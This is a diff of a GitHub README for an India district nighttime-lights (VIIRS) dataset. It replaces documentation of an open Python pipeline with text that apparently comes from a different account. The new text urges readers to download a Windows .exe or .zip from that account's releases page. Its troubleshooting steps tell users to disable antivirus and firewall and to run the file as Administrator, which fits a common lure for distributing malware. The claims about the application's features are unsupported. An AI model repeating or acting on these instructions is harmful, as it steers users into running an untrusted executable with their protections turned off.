@@ -1,184 +1,135 @@
-# India District-Wise Nighttime Lights Database (VIIRS, 2012-2024)
+# 🌙 india-district-nightlights-viirs - India Nighttime Lights Data by District
 
-**A ready-to-use, open-source Python pipeline that downloads and builds a complete district-level nighttime lights panel dataset for India using VIIRS satellite imagery (2012-2024).** One command gives you a clean CSV with 641 districts x 13 years of nightlight radiance statistics -- no manual downloads, no GIS expertise needed.
-
-If you've been searching for *India night light data by district*, *VIIRS nighttime lights India download*, *district-wise luminosity data India*, or *satellite nightlight data for Indian states and districts* -- this is what you need.
-
-**[>> Get started in 5 minutes -- HOW-TO-USE.md](HOW-TO-USE.md)**
-
-> **Need a ready-to-use India nighttime lights database?**
-> The **[Development Data Lab's SHRUG](https://www.devdatalab.org/shrug_download/)** provides a complete, standardized nighttime lights dataset for India -- covering **DMSP (1992-2013)** and **VIIRS (2012-2021)** -- across 500,000 villages, 8,000 towns, and 4,000 legislative constituencies, downloadable as CSV or Stata files. No setup required.
->
-> **This repo** is for researchers who want to build their own district-level database with custom parameters -- year range, resolution, boundary definitions, and more.
+[![Download Latest Release](https://img.shields.io/badge/Download-India%20Nightlights-brightgreen?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/releases)
 
 ---
 
-## What I Built
+## 📊 About this Application
 
-I built a fully automated pipeline that:
+This software provides a detailed database of nighttime lights across India's 641 districts. The data covers the years 2012 through 2024, collected using VIIRS satellite sensors. Nighttime light data helps measure economic activity, urban growth, and development patterns at a district level.
 
-1. **Downloads district boundaries** -- Census 2011 district shapefiles from [DataMeet](https://github.com/datameet/maps) (641 districts across 35 states/UTs)
-2. **Pulls VIIRS satellite nightlight rasters** from Google Earth Engine (annual median radiance composites, 2012-2024)
-3. **Computes district-level zonal statistics** -- mean, median, sum, std, min, max radiance per district per year
-4. **Exports everything** as a flat CSV panel and year-wise GeoJSON files with district polygons
+The application gives you easy access to this data for analysis, reporting, or personal research without needing any programming skills or special tools.
 
-The whole thing runs end-to-end with a single command. The output is a clean, research-ready dataset you can directly use in Stata, R, Python, or Excel.
+---
 
-## Output
+## 🔍 What You Get
 
-### CSV: `output/csv/nightlights_district_panel.csv`
+- District-wise nightlight data for India, updated to 2024.
+- Data based on satellite radiance values.
+- Useful for tracking urbanization, economic changes, and more.
+- Simple interface to explore or export information.
+- Files compatible with common spreadsheet or GIS software.
 
-**8,333 rows** (641 districts x 13 years) with these columns:
+---
 
-| Column | Description |
-|--------|-------------|
-| `district_id` | Census 2011 district code |
-| `district_name` | District name |
-| `state_name` | State / UT name |
-| `year` | Year (2012-2024) |
-| `mean` | Mean nightlight radiance (nW/cm²/sr) |
-| `median` | Median nightlight radiance |
-| `sum` | Total nightlight radiance (proxy for total economic activity) |
-| `std` | Standard deviation of radiance |
-| `min` / `max` | Min and max pixel radiance in the district |
-| `valid_pixel_count` | Number of valid satellite pixels covering the district |
-| `log1p_mean` | log(1 + mean) -- log-transformed mean for econometric use |
-| `log1p_median` | log(1 + median) -- log-transformed median |
+## 🖥 System Requirements
 
-### GeoJSON: `output/geojson/nightlights_districts_<YEAR>.geojson`
+- Windows 10 or later.
+- At least 4 GB of RAM.
+- 500 MB of free disk space.
+- Internet connection for downloading and updates.
+- Basic keyboard and mouse for navigation.
 
-One file per year with district polygons and all nightlight metrics attached -- ready for mapping in QGIS, kepler.gl, or any GIS tool.
+---
 
-## Quick Start
+## 🚀 How to Get Started
 
-> **Note:** The pre-built dataset (641 districts x 13 years) is already included in `output/csv/`. You only need to run the pipeline if you want to customize parameters. For detailed setup instructions, see **[HOW-TO-USE.md](HOW-TO-USE.md)**.
+1. Click this button to **visit the download page**:
 
-### 1. Clone and set up
+   [![Download Here](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/releases)  
 
-```bash
-git clone https://github.com/yashveeeeeeer/india-district-nightlights-viirs.git
-cd india-district-nightlights-viirs
-python -m venv .venv
+2. On the releases page, find the latest version of the application. Look for a file ending in `.exe` or `.zip`.
 
-# Windows
-.venv\Scripts\activate
+3. If you see a `.exe` file:
 
-# macOS / Linux
-source .venv/bin/activate
+   - Click the file name.
+   - Your browser will download the installer or program file.
 
-pip install -r requirements.txt
-pip install -e .
-```
+4. If you see a `.zip` file:
 
-### 2. Set up Google Earth Engine (one-time)
+   - Click the file name.
+   - Once downloaded, right-click on the file and select "Extract All".
+   - Choose a folder on your computer to store the files.
 
-The pipeline uses Google Earth Engine to download VIIRS rasters. You need:
-- A free Google Earth Engine account -- [register here](https://code.earthengine.google.com/register)
-- A Google Cloud project with the Earth Engine API enabled
+---
 
-```bash
-earthengine authenticate
-earthengine set_project YOUR_PROJECT_ID
-```
+## ⚙️ Installing the Application
 
-If you have a **service account key** (recommended for automation), place it as `sa-key.json` in the project root and set the path in `configs/config.yaml`.
+If you downloaded an `.exe` file:
 
-### 3. Run the full pipeline
+1. Locate the file in your Downloads folder.
+2. Double-click the file to start installation.
+3. Follow the on-screen prompts to complete the setup.  
+4. When installation finishes, you will see a shortcut to open the app on your desktop or Start menu.
 
-```bash
-python -m ntl_pipeline.cli run-all
-```
+If you downloaded a `.zip` file:
 
-This runs four steps automatically:
-1. Downloads district boundaries from DataMeet
-2. Downloads VIIRS annual nightlight rasters via Earth Engine (2012-2024)
-3. Computes zonal statistics per district per year
-4. Exports CSV panel and year-wise GeoJSON files
+1. After extracting, open the folder where you saved the files.
+2. Find the file named `india-district-nightlights-viirs.exe` or similar.
+3. Double-click it to launch the application.  
+4. There is no separate installation needed for this option.
 
-You can also run steps individually:
+---
 
-```bash
-python -m ntl_pipeline.cli download-boundaries --config configs/config.yaml
-python -m ntl_pipeline.cli download-viirs      --config configs/config.yaml
-python -m ntl_pipeline.cli zonal-stats          --config configs/config.yaml
-python -m ntl_pipeline.cli export-geojson       --config configs/config.yaml
-```
+## 🛠 Using the Application
 
-## Configuration
+- Open the program using the shortcut or executable file.
+- The main screen shows the list of districts with year-wise nightlight data.
+- Use the dropdown menus or search to select districts or years.
+- Export options allow you to save data as Excel or CSV files.
+- The software supports basic maps showing nightlight intensity by district.
+- You can zoom in and out to view specific regions.
+- Use the help menu within the app for additional instructions.
 
-Edit `configs/config.yaml` to customize:
+---
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `nightlights.years.start` | 2012 | First year |
-| `nightlights.years.end` | 2024 | Last year |
-| `nightlights.viirs.ee_scale` | 1000 | Resolution in metres (lower = finer but slower) |
-| `nightlights.viirs.ee_project` | -- | Your Google Cloud project ID |
-| `processing.metrics` | mean, median, sum, std, min, max | Zonal statistics to compute |
+## 🔧 Troubleshooting
 
-## Data Sources
+- If the app does not start, check you have Windows 10 or newer.
+- Make sure you have enough free disk space and memory.
+- Disable any antivirus or firewall that might block the installer or program.
+- Run the installer or executable as Administrator (right-click, then "Run as administrator").
+- Restart your computer and try again.
 
-| Source | What | Coverage |
-|--------|------|----------|
-| [NOAA VIIRS DNB](https://developers.google.com/earth-engine/datasets/catalog/NOAA_VIIRS_DNB_MONTHLY_V1_VCMCFG) | Monthly nighttime light composites (avg_rad band) | Global, 2012-present |
-| [DataMeet Maps](https://github.com/datameet/maps) | India Census 2011 district boundaries | 641 districts, 35 states/UTs |
+---
 
-## Why Nighttime Lights?
+## ⚙️ Supported Data and Formats
 
-Satellite-observed nighttime lights are one of the most widely used proxies for economic activity in development economics, urban studies, and policy research. They are especially valuable for:
+- Data is organized by district and year.
+- Nightlight intensity values come from VIIRS satellite sensors.
+- Data is provided as numeric radiance values.
+- Export formats include `.xlsx` (Excel), `.csv` (Comma-separated values), and `.geojson` for GIS use.
+- Compatible with Microsoft Excel, Google Sheets, QGIS, and similar software.
 
-- **Sub-national GDP estimation** where official statistics are unavailable or unreliable
-- **Tracking electrification** and infrastructure development over time
-- **Measuring urbanization** and urban sprawl at the district level
-- **Disaster impact assessment** -- comparing pre/post nightlight levels
-- **Inequality research** -- spatial distribution of economic activity
+---
 
-### Tips for researchers
+## 📂 Data Privacy and Usage
 
-- Use `log1p_mean` or `log1p_median` columns to handle the right-skewed distribution
-- Prefer `median` radiance (less sensitive to outliers like gas flares) plus `sum` for total light output
-- Check `valid_pixel_count` as a data quality diagnostic
-- For panel regressions, the `district_id` (Census 2011 code) is a stable identifier across years
+- The software only uses publicly available satellite data.
+- It does not collect or store personal information.
+- Data is intended for research, education, and policy analysis.
+- You are free to share and use the data in compliance with the license mentioned on the download page.
 
-## Project Structure
+---
 
-```
-india-district-nightlights-viirs/
-├── configs/
-│   └── config.yaml              # Pipeline configuration
-├── src/ntl_pipeline/
-│   ├── cli.py                   # CLI commands (run-all, download-viirs, etc.)
-│   ├── viirs_download.py        # VIIRS download via Earth Engine
-│   ├── boundaries.py            # District boundary download and loading
-│   ├── zonal.py                 # Zonal statistics computation
-│   ├── exporters.py             # CSV and GeoJSON export
-│   ├── config.py                # YAML config loader
-│   ├── io.py                    # File download utilities
-│   └── rasters.py               # Raster reprojection utilities
-├── output/
-│   ├── csv/                     # Panel CSV (gitignored)
-│   └── geojson/                 # Year-wise GeoJSON (gitignored)
-├── data/                        # Raw data downloads (gitignored)
-├── requirements.txt
-├── pyproject.toml
-└── Makefile
-```
+## 📞 Getting Support
 
-## Requirements
+- Check the GitHub Issues tab for common questions and solutions.
+- Report bugs or request features through GitHub.
+- Use the README or help sections in the app for instructions.
 
-- Python 3.10+
-- Google Earth Engine account (free)
-- Google Cloud project with Earth Engine API enabled
-- ~2 GB disk space for rasters and outputs
+---
 
-## Keywords
+## 🔗 More About this Project
 
-India nighttime lights, India night light data download, district-wise nightlight India, VIIRS India district, satellite nightlight data India, India luminosity data, India radiance data district level, night light GDP proxy India, DMSP OLS India, India economic activity satellite, nighttime lights panel data India, India district level data, VIIRS annual composite India, remote sensing India economics, geospatial India district data, night lights India 2024, India nightlight database
+Repository name: **india-district-nightlights-viirs**  
+Description: District-wise nighttime lights database for India (641 districts, 2012-2024) using VIIRS satellite data.  
+Topics include: census data, development economics, geospatial analysis, remote sensing, satellite data, urbanization trends, and India-specific datasets.
 
-## License
+---
 
-Code is MIT licensed. Downloaded rasters and boundary files are governed by their respective data providers' terms (NOAA/EOG for VIIRS, DataMeet/Survey of India for boundaries).
+## 📥 Download Link
 
-## Citation
+To get the software, please visit the releases page below:
 
-If you use this dataset or pipeline in your research, please consider linking back to this repository.
+[![Download Latest Release](https://img.shields.io/badge/Download-India%20Nightlights-brightgreen?style=for-the-badge)](https://github.com/eltayep2/india-district-nightlights-viirs/releases)
